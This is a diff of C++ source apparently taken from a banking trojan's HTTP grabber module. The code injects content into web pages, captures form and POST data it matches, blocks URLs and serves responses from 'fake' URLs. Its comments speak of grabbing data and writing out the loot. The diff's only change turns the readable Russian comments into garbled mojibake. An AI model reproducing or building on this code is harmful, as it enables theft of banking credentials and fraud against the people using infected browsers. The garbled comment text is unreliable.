+  //пїЅпїЅпїЅпїЅ URL пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   if(retVal & ANALIZEFLAG_URL_BLOCKED)
   {
 #   if defined WDEBUG0
@@ -826,7 +837,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
     goto END;
   }
 
-  //Проверка на инжекты и фейки.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
   if(checkRequestForInject(requestData))
   {
     retVal |= ANALIZEFLAG_URL_INJECT;
@@ -835,7 +846,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 #   endif
   }
 
-  //Проверка на замену POST-данных.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ.
   if(retVal & HttpGrabber::ANALIZEFLAG_POSTDATA_URLENCODED && replacePostData(requestData))
   {
     retVal |= ANALIZEFLAG_POSTDATA_REPLACED;
@@ -851,7 +862,7 @@ END:
 
 bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD contextSize, const INJECTFULLDATA *dataList, DWORD count)
 {
-  DWORD changesCount = 0; //Кол. примененых инжектов.
+  DWORD changesCount = 0; //пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   OutputDebugStringA(url);
   for(DWORD i = 0; i < count; i++)
@@ -860,7 +871,7 @@ bool HttpGrabber::_executeInjects(const LPSTR url, LPBYTE *context, LPDWORD cont
     OutputDebugStringA(curData->contextMask);
     DWORD matchFlags = curData->flags & HttpInject::FLAG_CONTEXT_CASE_INSENSITIVE ? Str::MATCH_CASE_INSENSITIVE_FAST : 0;
 
-    //Проверка маски контента.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(curData->contextMask != NULL && !_matchContextA(curData->contextMask, *context, *contextSize, matchFlags))
     {
 #     if defined WDEBUG0
@@ -875,19 +886,19 @@ OutputDebugStringA("2");
     LPBYTE curBlock        = (LPBYTE)curData->injects;
     LPBYTE endBlock        = curBlock + curData->injectsSize;
 
-    //Применяем инжекты, грабим данные.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     while(curBlock < endBlock)
     {
-      //Ищим место замены.
-      DWORD offsetBegin; //Начало данных для замены.
-      DWORD offsetEnd;   //Конец данных для замены.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+      DWORD offsetBegin; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+      DWORD offsetEnd;   //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       HttpInject::INJECTBLOCK *blockPrefix = (HttpInject::INJECTBLOCK *)curBlock;
       HttpInject::INJECTBLOCK *blockPostfix  = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPrefix + blockPrefix->size);
       HttpInject::INJECTBLOCK *blockNew    = (HttpInject::INJECTBLOCK *)((LPBYTE)blockPostfix + blockPostfix->size);
       
-      curBlock = (LPBYTE)blockNew + blockNew->size; //Следующий элемент.
+      curBlock = (LPBYTE)blockNew + blockNew->size; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       
-      //Получаем позицию начала.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 OutputDebugStringA("3");
       if(blockPrefix->size == sizeof(HttpInject::INJECTBLOCK))
       {
@@ -900,7 +911,7 @@ OutputDebugStringA("5");
         continue;
       }
       
-      //Получаем позицию конца.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
       if(blockPostfix->size == sizeof(HttpInject::INJECTBLOCK))
       {
 OutputDebugStringA("6");
@@ -919,9 +930,9 @@ OutputDebugStringA("8");
         continue;
       }      
       
-      DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //Размер ставляемых данных.
-      DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //Размер наденых данных.
-      //Замена.
+      DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+      DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+      //пїЅпїЅпїЅпїЅпїЅпїЅ.
 OutputDebugStringA("9");
       if(curData->flags & HttpInject::FLAG_IS_INJECT)
       {
@@ -929,7 +940,7 @@ OutputDebugStringA("10");
         DWORD newSize = *contextSize - matchedDataSize + blockNewDataSize;
         LPBYTE newBuf  = (LPBYTE)Mem::alloc(newSize);
 
-        if(newBuf != NULL) //Не обращаем внимание на ошибку.
+        if(newBuf != NULL) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         {
 OutputDebugStringA("11");
           Mem::_copy(newBuf,                                  *context,                                           offsetBegin);
@@ -946,10 +957,10 @@ OutputDebugStringA("11");
           changesCount++;
         }
       }
-      //Сохранение.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       else if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
       {
-        if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //Не обращаем внимание на ошибку.
+        if(Mem::reallocEx(&grabbedData, grabbedDataSize + blockNewDataSize + matchedDataSize + 1/*\n*/ + 1/*\0*/)) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         {
           if(blockNewDataSize > 0)
           {
@@ -967,7 +978,7 @@ OutputDebugStringA("11");
       }
     }
 
-    //Пишим награбленное.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(curData->flags & HttpInject::FLAG_IS_CAPTURE)
     {
       /*if(grabbedData == NULL)
@@ -1018,26 +1029,26 @@ OutputDebugStringA("11");
 
     if(curData->blockOnUrl != NULL)
     {
-      //Суточное ограничение.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       if(curData->flags & HttpInject::FLAG_ONCE_PER_DAY)
       {
         WCHAR key[CORE_REGISTRY_KEY_BUFFER_SIZE];
         WCHAR value[max(CORE_REGISTRY_VALUE_BUFFER_SIZE, (MD5HASH_SIZE * 2 + 1))];
         Core::getRegistryValue(Core::RV_LOCALCONFIG, key, value);
 
-        //Получаем хэш.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
         BYTE hash[MD5HASH_SIZE];
         if(Crypt::_md5Hash(hash, curData->blockOnUrl, Str::_LengthA(curData->blockOnUrl)))
         {
           Str::_toHexW(hash, MD5HASH_SIZE, value);
 
-          //Ставим значение.
+          //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           SYSTEMTIME curTime;
           CWA(kernel32, GetLocalTime)(&curTime);
           Registry::_setValueAsBinary(HKEY_CURRENT_USER, key, value, REG_BINARY, &curTime, sizeof(SYSTEMTIME));
         }
       }
-      //Обычная блокировка.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       else
       {
 #       if defined WDEBUG1
@@ -1089,7 +1100,7 @@ void HttpGrabber::_freeInjectFullDataList(INJECTFULLDATA *dataList, DWORD count)
   Mem::free(dataList);
 }
 
-//Данные для фейка.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 typedef struct
 {
   HttpGrabber::REQUESTDATA *requestData;
@@ -1098,24 +1109,24 @@ typedef struct
 }FAKECONNECT;
 
 /*
-  Создание запроса к фейк-URL.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ-URL.
 
-  IN requestData - данные запроса.
-  IN faketUrl    - фейк-URL.
+  IN requestData - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN faketUrl    - пїЅпїЅпїЅпїЅ-URL.
   IN verb        - GET/POST.
 
-  Return         - хэндл запроса, NULL - в случаи ошибки.
+  Return         - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, NULL - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD WINAPI fakeConnectProc(void *p)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
   FAKECONNECT *fc = (FAKECONNECT *)p;
   
-  //Парсим URL.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ URL.
   HttpTools::URLDATA urlData;
   if(HttpTools::_parseUrl(fc->fakeUrl, &urlData))
   {
-    //Соединяемся.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     HINTERNET fakeInternet = CWA(wininet, InternetOpenA)(coreData.httpUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if(fakeInternet != NULL)
     {
@@ -1143,7 +1154,7 @@ static DWORD WINAPI fakeConnectProc(void *p)
 
         if(fakeRequest != NULL)
         {
-          //Добавляем заголовоки.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           {
             LPSTR header;
 
@@ -1173,7 +1184,7 @@ static DWORD WINAPI fakeConnectProc(void *p)
             }
           }
 
-          //Отправляем запрос.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           if(CWA(wininet, HttpSendRequestA)(fakeRequest, NULL, 0, fc->requestData->postData, fc->requestData->postDataSize) == TRUE)
           {
             DWORD size   = sizeof(DWORD);
@@ -1206,7 +1217,7 @@ static DWORD WINAPI fakeConnectProc(void *p)
 
 HINTERNET HttpGrabber::_createFakeResponse(REQUESTDATA *requestData, INJECTFULLDATA *fakeData)
 {
-  //Генерируем URL фейка.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL пїЅпїЅпїЅпїЅпїЅ.
   FAKECONNECT fakeConnect;
   fakeConnect.requestData = requestData;
   fakeConnect.fakeRequest = NULL;
@@ -1218,10 +1229,10 @@ HINTERNET HttpGrabber::_createFakeResponse(REQUESTDATA *requestData, INJECTFULLD
   WDEBUG1(WDDT_INFO, "fakeConnect.fakeUrl=[%S].", fakeConnect.fakeUrl);
 # endif
   
-  //Вызываем поток для прозрачного подключения.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(fakeConnect.fakeUrl != NULL)
   {
-    Core::initHttpUserAgent(); //Нужно вызвать здесь, т.к. вызов в другом потоке приведет к deadlock.
+    Core::initHttpUserAgent(); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ deadlock.
 
 #   if defined WDEBUG0
     WDEBUG0(WDDT_INFO, "Sending request to fake.");
@@ -1241,7 +1252,7 @@ HINTERNET HttpGrabber::_createFakeResponse(REQUESTDATA *requestData, INJECTFULLD
     Mem::free(fakeConnect.fakeUrl);
   }
   
-  //Проверяем результат.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 # if(BO_DEBUG > 0 && defined WDEBUG)
   if(fakeConnect.fakeRequest == NULL)WDEBUG0(WDDT_ERROR, "Failed to create fake request.");
 # endif  
